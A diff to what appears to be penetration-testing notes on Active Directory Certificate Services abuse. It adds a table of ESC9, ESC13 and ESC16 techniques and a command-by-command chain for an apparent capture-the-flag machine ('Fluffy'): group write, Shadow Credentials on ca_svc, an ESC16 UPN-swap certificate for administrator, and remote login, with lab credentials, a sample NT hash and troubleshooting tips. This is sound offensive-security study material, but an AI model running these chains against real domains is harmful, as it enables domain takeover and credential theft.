@@ -210,8 +210,9 @@ certipy-ad find -u <user>@<dom>.local -hashes <NTLM> -dc-ip <dc-ip> -vulnerable 
 | **ESC6** | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set | Any template → supply SAN → ESC1 |
 | **ESC7** | You have `ManageCA` / `ManageCertificates` on the CA itself | Approve your own pending cert / enable the ESC6 flag |
 | **ESC8** | HTTP endpoint of CA + NTLM enabled | NTLM relay coerced auth → get cert |
-| **ESC9/10** | UPN or `msDS-KeyCredentialLink` weirdness | Cert-based hash steal |
-| **ESC16** | Certifried variant on machine account attribute writes | Impersonate a computer, request cert |
+| **ESC9/10** | Template/UPN lets you drop the SID binding (no `szOID_NTDS_CA_SECURITY_EXT`) | Swap a controlled account's UPN to the target, request cert, auth |
+| **ESC13** | Enroll right + template linked to a privileged group via an issuance policy / OID group link | Enroll → cert carries the group membership |
+| **ESC16** | **CA-wide**: the CA omits the SID security extension on *all* issued certs | Swap any controlled enrollee's UPN to the target, request on a basic client-auth template (e.g. `User`), auth, restore UPN |
 
 #### ESC1 (request cert as Administrator directly)
 
@@ -280,6 +281,65 @@ low-priv user
   → certipy-ad auth -pfx administrator.pfx   → Administrator NT hash
   → impacket-psexec -hashes :<NTLM> administrator@dc
 ```
+
+#### Chain: group write → Shadow Creds → ESC16 (Fluffy)
+
+When your ACL edge is over a **group** (not the CA account directly) and the CA
+is globally ESC16-vulnerable. One-liner:
+`write on group` → self into group → Shadow Creds on `ca_svc` → ESC16 UPN-swap cert as administrator → DA.
+
+```bash
+DC=<dc-ip>          # e.g. DC01.fluffy.htb / its IP
+DOM=fluffy.htb
+U=p.agila; P='prometheusx-303'
+
+## 1. Group write -> object control. The ACL is on the group, so add YOURSELF
+##    to it to inherit the group's control over its members. Re-auth after
+##    (new group SID must be in your ticket / fresh TGT).
+bloodyAD --host $DC -d $DOM -u $U -p "$P" add groupMember "Service Accounts" $U
+
+## 2. Shadow Credentials -> ca_svc NT hash. Group membership grants write over
+##    ca_svc's msDS-KeyCredentialLink. PKINIT recovers the hash, no cracking.
+certipy-ad shadow auto -u $U@$DOM -p "$P" -dc-ip $DC -account ca_svc
+##    -> ca_svc NT hash (e.g. ca0f4f9e9eb8a092addf53bb03fc98c8)
+
+## 3. ESC16 -> cert as administrator. Swap ca_svc's UPN to the target, request
+##    on a basic client-auth template (User), auth, then RESTORE the UPN.
+certipy-ad account -u ca_svc@$DOM -hashes :<ca_svc-hash> -dc-ip $DC \
+    -user ca_svc -upn administrator@$DOM update
+certipy-ad req -u ca_svc@$DOM -hashes :<ca_svc-hash> \
+    -dc-ip $DC -target DC01.$DOM -ca fluffy-DC01-CA -template User \
+    -upn administrator@$DOM
+certipy-ad auth -pfx administrator.pfx -dc-ip $DC
+##    -> administrator NT hash
+evil-winrm -i $DC -u administrator -H <admin-hash>
+
+## 4. Cleanup: restore ca_svc's UPN, and clear any fake SPN you set.
+certipy-ad account -u ca_svc@$DOM -hashes :<ca_svc-hash> -dc-ip $DC \
+    -user ca_svc -upn ca_svc@$DOM update
+```
+
+**Gotchas that cost time on this chain:**
+- **ACL on a group != ACL on its members.** First shadow attempt failed
+  `INSUFF_ACCESS_RIGHTS (0x2098)` because control was over the *group*. Always
+  check whether a write primitive is on the object or on a group that contains
+  it — add yourself to the group first, then re-auth.
+- **Prefer Shadow Creds over Kerberoasting when you can write.** Targeted-roast
+  was wasted effort here (the TGS hash wasn't in rockyou). Shadow creds gives the
+  NT hash directly, no cracking, whenever you can write `msDS-KeyCredentialLink`
+  and the DC has a KDC cert (AD CS present = it does).
+- **UPN must be fully qualified.** Bare `administrator` produced a cert with SAN
+  `administrator` -> Kerberos auth failed "name mismatch." Use
+  `-upn administrator@$DOM` on **both** `account update` and `req`. For ESC16
+  certs (no SID), `certipy-ad auth ... -ldap-shell` is a fallback when PKINIT
+  name-matching is fussy.
+- **A client-side RPC timeout does not mean the request failed.** "NETBIOS timed
+  out" after connecting to `\pipe\cert` was a red herring — the request reached
+  the CA (request ID was assigned). The hang tracked the UPN not being set
+  correctly; once the UPN was right the same `req` succeeded.
+- **Confirm the ESC from enum, not a walkthrough.** Always run
+  `certipy-ad find -vulnerable` first — `-template` choice and UPN placement
+  differ between ESC9 / ESC13 / ESC16.
 
 ### Mapping BloodHound Edges to Tooling
 
